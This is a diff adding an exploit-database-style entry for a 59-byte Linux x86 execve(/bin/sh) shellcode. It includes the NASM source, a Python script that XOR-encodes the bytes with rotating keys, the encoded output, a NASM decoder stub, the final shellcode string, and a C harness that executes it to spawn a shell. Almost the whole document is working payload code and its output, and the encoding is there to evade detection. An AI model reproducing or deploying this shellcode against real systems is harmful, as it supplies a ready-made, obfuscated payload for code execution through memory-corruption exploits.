@@ -1,0 +1,139 @@
+# Title: Linux/x86 - Multiple keys XOR Encoder / Decoder execve(/bin/sh) Shellcode (59 bytes)
+# Author: Xavi Beltran
+# Date: 05/05/2019
+# Contact: xavibeltran@protonmail.com
+# Purpose: spawn /bin/sh shell
+# Tested On: Ubuntu 3.5.0-17-generic
+# Arch: x86
+# Size: 59 bytes
+
+############################################## sh.nasm ###############################################
+global _start			
+section .text
+_start:
+	xor eax, eax
+	push eax
+	push 0x68732f2f
+	push 0x6e69622f
+	mov ebx, esp
+	push eax
+	mov edx, esp
+	push ebx
+	mov ecx, esp
+	mov al, 11
+	int 0x80
+
+
+###################################### original shellcode #############################################
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
+
+
+#################################  encoder-xor-multiple-keys.py  ######################################
+#!/usr/bin/python
+# Autor: Xavi Beltran
+# Date: 05/05/2019
+
+shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
+
+encoded = ""
+encoded2 = ""
+
+print 'Encoded shellcode ...'
+
+i = 1
+for x in bytearray(shellcode) :
+
+	if  i == 11:
+		i = 1
+	y = x^i
+	encoded += '\\x'
+	encoded += '%02x' % y
+
+	encoded2 += '0x'
+	encoded2 += '%02x,' %y
+	
+	i = i + 0x01
+
+print encoded
+
+print encoded2
+
+print 'Len: %d' % len(bytearray(shellcode))
+
+
+######################################### Encoded Shellcode  ###############################################
+
+socket@ubuntu:~/Assesments/4$ python encoder-xor-multiple-keys.py 
+Encoded shellcode ...
+\x30\xc2\x53\x6c\x2a\x29\x74\x60\x61\x25\x63\x6b\x6d\x8d\xe6\x56\x8e\xea\x5a\x83\xe0\xb2\x08\xc9\x85
+0x30,0xc2,0x53,0x6c,0x2a,0x29,0x74,0x60,0x61,0x25,0x63,0x6b,0x6d,0x8d,0xe6,0x56,0x8e,0xea,0x5a,0x83,0xe0,0xb2,0x08,0xc9,0x85,
+Len: 25
+
+
+#################################### decoder-xor-multiple-keys.nasm  ###############################################
+
+; Filename: xor-decoder-multiple-keys.nasm
+; Author:  Xavi Beltran
+; Date: 05/05/2019
+
+global _start			
+
+section .text
+_start:
+
+	xor edx, edx
+	mov dl, 1
+	jmp short call_decoder
+
+decoder:
+	pop esi
+	xor ecx, ecx
+	mov cl, 25
+
+
+decode:
+	cmp dl, 0x0b
+	jz xor_counter
+	xor byte [esi], dl
+	inc esi
+	inc dl
+	loop decode
+
+	jmp short Shellcode
+
+xor_counter:
+	mov dl, 1
+	jmp decode
+
+call_decoder:
+
+	call decoder
+	Shellcode: db 0x30,0xc2,0x53,0x6c,0x2a,0x29,0x74,0x60,0x61,0x25,0x63,0x6b,0x6d,0x8d,0xe6,0x56,0x8e,0xea,0x5a,0x83,0xe0,0xb2,0x08,0xc9,0x85
+
+
+############################################### final shellcode ################################################
+
+socket@ubuntu:~/Assesments/4$ ./objdump_parser.sh decoder-xor-multiple-keys
+"\x31\xd2\xb2\x01\xeb\x17\x5e\x31\xc9\xb1\x19\x80\xfa\x0b\x74\x09\x30\x16\x46\xfe\xc2\xe2\xf4\xeb\x09\xb2\x01\xeb\xee\xe8\xe4\xff\xff\xff\x30\xc2\x53\x6c\x2a\x29\x74\x60\x61\x25\x63\x6b\x6d\x8d\xe6\x56\x8e\xea\x5a\x83\xe0\xb2\x08\xc9\x85"
+socket@ubuntu:~/Assesments/4$ ./shellcode 
+Shellcode Length:  59
+$ whoami
+socket
+
+socket@ubuntu:~/Assesments/4$ cat shellcode.c 
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = \
+"\x31\xd2\xb2\x01\xeb\x17\x5e\x31\xc9\xb1\x19\x80\xfa\x0b\x74\x09\x30\x16\x46\xfe\xc2\xe2\xf4\xeb\x09\xb2\x01\xeb\xee\xe8\xe4\xff\xff\xff\x30\xc2\x53\x6c\x2a\x29\x74\x60\x61\x25\x63\x6b\x6d\x8d\xe6\x56\x8e\xea\x5a\x83\xe0\xb2\x08\xc9\x85";
+
+main()
+{
+
+	printf("Shellcode Length:  %d\n", strlen(code));
+
+	int (*ret)() = (int(*)())code;
+
+	ret();
+
+}
